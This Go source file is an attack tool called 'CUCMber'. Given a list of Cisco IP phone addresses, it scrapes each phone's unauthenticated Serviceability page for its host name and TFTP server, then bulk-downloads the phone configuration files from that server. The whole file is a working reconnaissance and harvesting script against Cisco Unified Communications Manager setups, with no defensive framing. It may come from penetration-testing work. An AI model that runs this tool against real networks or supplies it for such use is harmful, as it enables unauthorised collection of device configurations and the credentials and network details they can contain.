package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"golang.org/x/net/html"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: program <ip_file>")
		os.Exit(1)
	}
	fileName := os.Args[1]
	f, err := os.Open(fileName)
	if err != nil {
		fmt.Println("Error opening file:", err)
		os.Exit(1)
	}
	defer f.Close()

	// Ensure output directory exists
	err = os.MkdirAll("output", 0755)
	if err != nil {
		fmt.Println("Error creating output directory:", err)
		os.Exit(1)
	}
	fmt.Println(`
   _____ _____ _____ _____ _           
  |     |  |  |     |     | |_ ___ ___ 
  |   --|  |  |   --| | | | . | -_|  _|
  |_____|_____|_____|_|_|_|___|___|_|
    CUCMber - by cola`)

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if ip == "" {
			continue
		}

		url := "http://" + ip + "/CGI/Java/Serviceability?adapter=device.statistics.configuration"
		resp, err := http.Get(url)
		if err != nil {
			fmt.Printf("%s: error fetching serviceability page: %v\n", ip, err)
			continue
		}
		hostName, tftp, err := parseHTML(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("%s: parse error: %v\n", ip, err)
			continue
		}
		fmt.Printf("%s, %s, %s\n", ip, tftp, hostName)

		// snag the config file
		configURL := "http://" + tftp + ":6970/" + hostName + ".cnf.xml.sgn"
		respConfig, err := http.Get(configURL)
		if err != nil {
			fmt.Printf("%s: error downloading config from %s: %v\n", ip, configURL, err)
			continue
		}
		defer respConfig.Body.Close()

		outFileName := "output/" + hostName + ".cnf.xml.sgn"
		outFile, err := os.Create(outFileName)
		if err != nil {
			fmt.Printf("Error creating file %s: %v\n", outFileName, err)
			continue
		}
		_, err = io.Copy(outFile, respConfig.Body)
		outFile.Close()
		if err != nil {
			fmt.Printf("Error saving config to %s: %v\n", outFileName, err)
			continue
		}
		fmt.Printf("Saved config for %s to %s\n", hostName, outFileName)
	}
	if err := scanner.Err(); err != nil {
		fmt.Println("Scanner error:", err)
	}
}

// extract hostname and tftp server
func parseHTML(r io.Reader) (hostName, tftp string, err error) {
	doc, err := html.Parse(r)
	if err != nil {
		return "", "", err
	}
	var f func(*html.Node)
	f = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "tr" {
			label, value := extractRow(n)
			lowerLabel := strings.ToLower(label)
			switch {
			case strings.Contains(lowerLabel, "host name") && hostName == "":
				hostName = value
			case strings.Contains(lowerLabel, "tftp server 1") && tftp == "":
				tftp = value
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			f(c)
		}
	}
	f(doc)
	if hostName == "" || tftp == "" {
		return hostName, tftp, fmt.Errorf("could not find required fields")
	}
	return hostName, tftp, nil
}

// support rows with either two cells (label, value) or three (label, spacer, value).
func extractRow(n *html.Node) (label, value string) {
	var tds []string
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		if c.Type == html.ElementNode && c.Data == "td" {
			text := extractText(c)
			tds = append(tds, strings.TrimSpace(text))
		}
	}
	if len(tds) == 2 {
		label = tds[0]
		value = tds[1]
	} else if len(tds) >= 3 {
		label = tds[0]
		value = tds[2]
	}
	return label, value
}

func extractText(n *html.Node) string {
	if n.Type == html.TextNode {
		return n.Data
	}
	var s string
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		s += extractText(c)
	}
	return s
}
